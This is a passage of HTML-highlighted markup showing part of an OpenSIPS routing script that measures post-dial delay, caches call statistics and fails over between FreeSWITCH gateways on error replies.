&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	do_accounting&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;log&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;missed&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	route&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;relay&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;onreply_route &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;invite_reply&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;$rs &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; 180&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;$Ts &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;dlg_val&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;start_ts&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;s.int&lt;span style=&#34;color:#f92672&#34;&gt;}))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			$var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;diff_sec&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			$var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;diff_usec&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $Tsm - &lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;dlg_val&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;start_tsm&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;s.int&lt;span style=&#34;color:#f92672&#34;&gt;})&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;$Tsm &amp;gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;dlg_val&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;start_tsm&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;s.int&lt;span style=&#34;color:#f92672&#34;&gt;}))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			$var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;diff_sec&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $Ts - &lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;dlg_val&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;start_ts&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;s.int&lt;span style=&#34;color:#f92672&#34;&gt;})&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			$var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;diff_usec&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $Tsm - &lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;dlg_val&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;start_tsm&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;s.int&lt;span style=&#34;color:#f92672&#34;&gt;})&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			$var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;diff_sec&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $Ts - &lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;dlg_val&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;start_ts&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;s.int&lt;span style=&#34;color:#f92672&#34;&gt;})&lt;/span&gt; - 1;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			$var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;diff_usec&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1000000&lt;/span&gt; + $Tsm - &lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;dlg_val&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;start_tsm&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;s.int&lt;span style=&#34;color:#f92672&#34;&gt;})&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		$var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;diff_usec&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;diff_usec&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; + $dlg_val&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;pdd_pen&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		cache_add&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;local&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;tot_sec&amp;#34;&lt;/span&gt;, $var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;diff_sec&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;, 0, $var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;nsv&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		cache_add&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;local&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;tot_usec&amp;#34;&lt;/span&gt;, $var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;diff_usec&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;, 0, $var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;nmsv&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		cache_add&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;local&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;tot&amp;#34;&lt;/span&gt;, 1, 0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;XXXX: &lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(diff_sec) s, &lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(diff_usec) us | &lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(nsv) | &lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(nmsv)\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;route&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;relay&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# for INVITEs enable some additional helper routes&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;INVITE&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		t_on_branch&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;per_branch_ops&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		t_on_failure&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;missed_call&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!t_relay&lt;span style=&#34;color:#f92672&#34;&gt;())&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		send_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;500&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Internal Error&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;branch_route&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;per_branch_ops&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;new branch at &lt;/span&gt;$ru&lt;span style=&#34;color:#e6db74&#34;&gt;\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;onreply_route&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;handle_nat&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;incoming reply\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;failure_route&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;missed_call&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;t_was_cancelled&lt;span style=&#34;color:#f92672&#34;&gt;())&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!math_eval&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$dlg_val&lt;span style=&#34;color:#e6db74&#34;&gt;(pdd_pen) + 10000&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$dlg_val&lt;span style=&#34;color:#e6db74&#34;&gt;(pdd_pen)&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;math eval error &lt;/span&gt;$rc&lt;span style=&#34;color:#e6db74&#34;&gt;\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	cache_add&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;local&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;neg_replies&amp;#34;&lt;/span&gt;, 1, 0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;t_check_status&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;(5|6)[0-9][0-9]&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;t_check_status&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;408&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; t_local_replied&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;all&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ERROR: FS GW error, status=&lt;/span&gt;$rs&lt;span style=&#34;color:#e6db74&#34;&gt;\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!lb_next&lt;span style=&#34;color:#f92672&#34;&gt;())&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ERROR: all FS are down!\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			send_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;503&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;No available destination&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;rerouting to &lt;/span&gt;$ru&lt;span style=&#34;color:#e6db74&#34;&gt; / &lt;/span&gt;$du&lt;span style=&#34;color:#e6db74&#34;&gt;\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	t_on_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;invite_reply&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	t_on_failure&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;missed_call&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	t_relay&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# uncomment the following lines if you want to block client &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# redirect based on 3xx replies.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;##if (t_check_status(&amp;#34;3[0-9][0-9]&amp;#34;)) {&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;##t_reply(&amp;#34;404&amp;#34;,&amp;#34;Not found&amp;#34;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;##	exit;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;##}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;timer_route &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;dump_pdd, 1&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	$var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;out&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0;
